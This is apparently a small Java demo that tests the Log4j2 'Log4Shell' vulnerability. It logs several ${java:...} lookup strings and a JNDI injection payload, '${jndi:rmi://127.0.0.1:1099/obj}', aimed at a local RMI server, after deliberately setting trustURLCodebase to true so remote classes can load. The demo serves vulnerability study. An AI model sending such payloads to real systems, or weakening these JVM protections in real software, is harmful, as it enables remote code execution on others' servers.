package com.github.bluegitter.log4j2;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 测试log4j漏洞
 **/
public class Log4jBugDemo {

    private static final Logger LOGGER = LogManager.getLogger(Log4jBugDemo.class);


    public static void main( String[] args ) {
        System.setProperty("java.rmi.server.useCodebaseOnly", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");


        String msg1 = "${java:vm}";
        String msg2 = "${java:version}";
        String msg3 = "${java:runtime}";
        String msg4 = "${java:os}";
        String msg5 = "${java:locale}";
        String msg6 = "${java:hw}";


        LOGGER.info( "msg {}", msg1 );
        LOGGER.info( "msg {}", msg2 );
        LOGGER.info( "msg {}", msg3 );
        LOGGER.info( "msg {}", msg4 );
        LOGGER.info( "msg {}", msg5 );
        LOGGER.info( "msg {}", msg6 );

        //jndi注入  我的服务：即业务应用，打印web返回的信息
        LOGGER.info( "msg:{}", "${jndi:rmi://127.0.0.1:1099/obj}" );
    }

}
